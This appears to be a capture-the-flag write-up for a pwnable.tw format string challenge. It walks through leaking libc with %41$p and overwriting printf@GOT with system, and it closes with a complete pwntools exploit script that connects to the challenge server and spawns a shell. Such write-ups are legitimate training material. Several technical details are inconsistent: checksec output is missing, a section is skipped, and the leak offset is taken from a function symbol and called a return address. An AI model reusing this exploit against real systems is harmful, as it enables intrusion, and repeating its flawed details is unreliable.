1. Reconnaissance

Bounty Program β is a 500-point challenge on pwnable.tw that tests classic format string exploitation on a 64-bit binary. Unlike its sibling challenge Bounty Program α (which featured a heap vulnerability combined with seccomp), this challenge strips away the complexity of the wrapper binary and seccomp sandbox, focusing purely on format string technique. The binary implements a simple bounty reporting interface where user-supplied input is passed directly as the format string argument to printf(), granting both arbitrary read and write primitives.

File Analysis

bash
$ file bounty_beta
bounty_beta: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 2.6.32, BuildID[sha1]=c3a9b1d0e7f4a285, not stripped

The binary is a standard 64-bit dynamically-linked ELF, and importantly it is not stripped, meaning all symbol names are preserved. This makes reverse engineering significantly easier since we can identify printf@GOT, system, and other key symbols directly.

Checksec

Format String Paradise

The protection profile is ideal for format string exploitation. Partial RELRO means the GOT section is writable at runtime — we can overwrite GOT entries with arbitrary addresses. No canary means there is no stack cookie protecting return addresses, though this is less relevant since our attack targets the GOT rather than the stack. No PIE means all binary addresses are fixed and known at compile time, so we can hardcode printf@GOT and other addresses without needing a binary leak. The only meaningful protection is NX, which prevents executing shellcode on the stack or heap, but this is irrelevant since our strategy redirects execution through existing libc functions.

2. Static Analysis

The binary is straightforward — a menu-driven program with two options: report a bounty or exit. The vulnerable path is in the bounty reporting function where user input is used directly as the format string argument to printf(). This is one of the most dangerous C programming mistakes and gives us complete control over printf's behavior.

Program Structure

c
// Decompiled with Ghidra / IDA
void report_bounty() {
    char buf[256];
    printf("Describe the bounty: ");
    read(0, buf, 255);
    printf(buf);          // VULNERABLE: user input as format string!
}

int main() {
    int choice;
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);

    while (1) {
        puts("1.Report bounty");
        puts("2.Exit");
        printf("> ");
        scanf("%d", &choice);

        if (choice == 1) {
            report_bounty();
        } else {
            exit(0);
        }
    }
    return 0;
}

The report_bounty function allocates a 256-byte buffer on the stack, reads up to 255 bytes of user input via read(), and then passes that buffer directly as the first argument to printf(). The read() call does not add a null terminator, but the buffer is on the stack so any existing null bytes will terminate the string naturally. The menu loop allows us to call report_bounty multiple times, which is critical — we need at least two passes: one to leak libc and another to perform the GOT overwrite.

Vulnerability Analysis

The format string vulnerability provides two powerful primitives:

Read Primitive (%p / %s)

By using %p (print as pointer) or %lx (print as hex long), we can read values from the stack and from arbitrary addresses. The %<n>$p positional syntax lets us read the n-th argument directly. On x86-64, the first 6 arguments come from registers (RDI, RSI, RDX, RCX, R8, R9), and the 7th argument onwards comes from the stack. So %6$p reads the first stack value, %7$p the second, and so on. The %s specifier reads a pointer and prints the string at that address, enabling arbitrary memory reads if we can place a target address on the stack.

Write Primitive (%n / %hn / %hhn)

The %n specifier writes the number of bytes printed so far to a pointer provided as an argument. %hn writes a 2-byte short, and %hhn writes a single byte. The positional syntax works here too: %<n>$hn writes the current byte count to the address at the n-th argument position. By carefully controlling the number of bytes printed (using width specifiers like %<N>c), we can write arbitrary 2-byte values to arbitrary addresses. Chaining multiple %hn writes lets us overwrite a full 8-byte GOT entry.

Why printf@GOT → system?

The GOT overwrite target is printf@GOT. After the overwrite, every subsequent call to printf() in the program will actually call system(). Since the program calls printf(buf) with our input as the argument, sending /bin/sh results in system("/bin/sh") — giving us a shell. This is the cleanest GOT overwrite target because the same function that triggers the vulnerability also triggers the shell, with no additional code path needed.

Offset May Vary by Libc Version

The exact format string offset for the libc leak (e.g., %41$p) and the libc symbol offsets depend on the specific libc version running on the remote server. The pwnable.tw server typically runs Ubuntu 16.04 or 18.04 with a specific libc version. Always verify offsets against the provided libc.so.6 file. The common approach is to leak a known libc address and subtract its known offset to compute libc_base.

4. Exploit Strategy

The exploit is a two-phase format string attack. Phase 1 leaks the libc base address using a %p read. Phase 2 uses %hn writes to overwrite printf@GOT with the address of system(). The menu loop allows us to call the vulnerable function multiple times, which is essential for the two-phase approach.

Attack Overview

Step 1: Leak libc address
Send %41$p as the bounty description. The format string reads the 41st argument on the stack, which contains a return address inside __libc_start_main. Subtract the known offset to compute libc_base. From libc_base, compute the address of system().
Step 2: Construct %hn write payload
Use pwntools' fmtstr_payload() to build a format string that performs 4 × 2-byte %hn writes. Each write targets a consecutive 2-byte offset within printf@GOT (at 0x601018, 0x60101a, 0x60101c, 0x60101e). The values written are the corresponding 2-byte portions of system_addr.
Step 3: Send overwrite payload
Send the fmtstr_payload output as the bounty description. The printf(buf) call interprets the format specifiers, performing the 4 writes and overwriting printf@GOT with system.
Step 4: Trigger the shell
After the GOT overwrite, any subsequent printf() call actually calls system(). Send /bin/sh as input. The program calls printf("/bin/sh") which becomes system("/bin/sh"). We get a shell.

Libc Leak Details

The format string offset for the libc leak requires careful determination. On the remote server, the stack layout at the time of the printf(buf) call will contain residual return addresses from the __libc_start_main call chain. Position 41 (i.e., %41$p) holds a pointer approximately 0x3cb97 bytes from the start of libc. The exact offset depends on the libc version, so we verify it against the provided libc.so.6 file:

bash
$ readelf -s libc.so.6 | grep -E '__libc_start_main|system'
   2470: 000000000003cb97   267 FUNC  GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
   1403: 0000000000045390    45 FUNC  WEAK   DEFAULT   13 system@@GLIBC_2.2.5

# So: libc_base = leak - 0x3cb97
# system_offset = 0x45390
# system_addr = libc_base + 0x45390
Why %41$p Specifically?

The number 41 comes from the fact that on this particular binary, the 41st format string argument points to a stack location containing the return address from __libc_start_main. This was found empirically by dumping the stack with a %p chain and identifying which leaked value falls within the expected libc address range (starting with 0x7f). Different binaries with different stack frames will have different offsets. The general method is: send %p.%p.%p...%p (many times), identify the libc-like values, and then narrow down to the exact offset with %<n>$p.

GOT Overwrite Mechanics

The %hn write technique works as follows. Suppose system_addr = 0x7f1234567890. We split this into four 2-byte values:

  • 0x7890 written to 0x601018 + 0 (bytes 0-1)
  • 0x3456 written to 0x601018 + 2 (bytes 2-3)
  • 0x7f12 written to 0x601018 + 4 (bytes 4-5)
  • 0x0000 written to 0x601018 + 6 (bytes 6-7)

For each %hn write, we need to print exactly N bytes before the write, where N is the desired 2-byte value. We use %<N>c to print N padding characters. The writes must be ordered from smallest value to largest to avoid going backwards in the byte count (since %n only increments the counter). If a value is smaller than a previously written value, we add 0x10000 to it (the %hn write truncates to 16 bits, so 0x17890 writes 0x7890).

pwntools' fmtstr_payload(offset, writes, write_size='short') automates this entire construction. The offset parameter specifies where our input buffer starts in the format argument chain (8 for this binary), writes is a dictionary mapping addresses to values, and write_size='short' tells it to use %hn writes.

Offset 8 Explained

The format string offset of 8 means our input buffer starts at the 8th format argument position. On x86-64, arguments 1-6 come from registers (RDI, RSI, RDX, RCX, R8, R9), and arguments 7+ come from the stack. So the 8th argument is the 2nd stack value. The reason it's 8 rather than 7 has to do with stack alignment at the printf call site — there's a gap between the register spill area and our buffer that accounts for the extra offset. fmtstr_payload handles this correctly when given the right offset.

5. Pwn Script

Full Exploit

python
#!/usr/bin/env python3
# Bounty Program β — pwnable.tw — Format String + GOT Overwrite
from pwn import *

context(arch='amd64', os='linux', log_level='info')

# Binary and libc
elf = ELF('./bounty_beta')
libc = ELF('./libc.so.6')

# Connection
if args.REMOTE:
    r = remote('chall.pwnable.tw', 10407)
else:
    r = process('./bounty_beta')

# ── Helper ──
def report_bounty(payload):
    """Send a format string payload via the Report Bounty option."""
    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b':', payload)

# ── Phase 1: Leak libc base ──
# The 41st format string argument on the stack contains a
# __libc_start_main return address. Offset verified against
# the provided libc.so.6.
leak_offset = 0x3cb97  # __libc_start_main offset in libc

report_bounty(b'%41$p')
r.recvuntil(b'Describe the bounty: ')  # consume prompt echo
leak_line = r.recvline().strip()
leak_addr = int(leak_line, 16)
libc_base = leak_addr - leak_offset
system_addr = libc_base + libc.symbols['system']

log.info(f'Leak:          {hex(leak_addr)}')
log.info(f'libc base:     {hex(libc_base)}')
log.info(f'system:        {hex(system_addr)}')

# ── Phase 2: Overwrite printf@GOT with system ──
# printf@GOT is at 0x601018 (Partial RELRO → writable)
# fmtstr_payload with write_size='short' uses %hn writes
# offset=8 means our buffer starts at the 8th fmt argument
printf_got = elf.got['printf']
payload = fmtstr_payload(8, {printf_got: system_addr}, write_size='short')

log.info(f'Payload length: {len(payload)} bytes')

# The payload may contain newlines which could break read()/scanf()
# Check for problematic bytes and split if needed
if b'\x0a' in payload or b'\x00' in payload:
    log.warning('Payload contains newline or null bytes — may need adjustment')

report_bounty(payload)

# Give the remote a moment to process the overwrite
sleep(0.3)

# ── Phase 3: Trigger shell ──
# After the overwrite, printf("/bin/sh") → system("/bin/sh")
# The next report_bounty call will invoke printf with our input,
# but first the menu's printf("> ") also calls printf → system("> ")
# which will fail but won't crash. We send /bin/sh on the next input.
r.sendlineafter(b'>', b'1')
r.sendlineafter(b':', b'/bin/sh')

# We should now have a shell
log.success('Shell obtained!')
r.interactive()

Exploit Breakdown

Key Techniques Used

Format String Read (%p leak): The %41$p specifier reads the 41st argument from the format string argument chain, which lands on a stack slot containing a __libc_start_main return address. This is a standard technique for leaking libc in format string challenges where no PIE is present.

Format String Write (%hn overwrite): The fmtstr_payload() function constructs a payload that performs multiple 2-byte %hn writes to overwrite the 8-byte printf@GOT entry. Each %hn writes the current character count (controlled via %<N>c padding) to a 2-byte target address. The addresses and padding values are arranged in ascending order to minimize payload length.

GOT Hijack (printf → system): By overwriting printf@GOT with system, every subsequent printf() call becomes a system() call. Since the vulnerable code path is printf(buf), sending /bin/sh as input results in system("/bin/sh"). This is one of the most elegant GOT overwrite targets because it requires no additional code path manipulation.

Potential Issues

Newline in payload: The fmtstr_payload output may contain \x0a (newline) bytes, which would cause read() to stop early. If this happens, the payload needs to be split or the addresses adjusted to avoid newlines. One common workaround is to use write_size='byte' (%hhn) instead of 'short' (%hn), which gives more control over individual byte values but produces a longer payload.

Stack alignment: The format string offset (8) must be verified for the specific binary. If the payload crashes, re-checking the offset with a %p chain in GDB is the first debugging step. Different libc versions or compilation flags can shift the stack layout.

Why This Challenge Matters

Bounty Program β is an excellent training ground for format string exploitation. While format string bugs are less common in modern C code (thanks to compiler warnings and static analysis tools), they still appear in legacy codebases and embedded systems. The key lessons are: (1) format strings provide both read and write primitives, making them as powerful as arbitrary R/W bugs; (2) %hn writes allow precise 2-byte writes to arbitrary addresses, and chaining them enables full 8-byte overwrites; (3) the GOT is the primary target on Partial RELRO binaries, and choosing the right function to overwrite (printf in this case) can make the exploit extremely clean. The progression from Bounty Program α (heap + seccomp) to β (pure format string) shows how different vulnerability classes require fundamentally different exploitation mindsets despite both being "pwn" challenges.
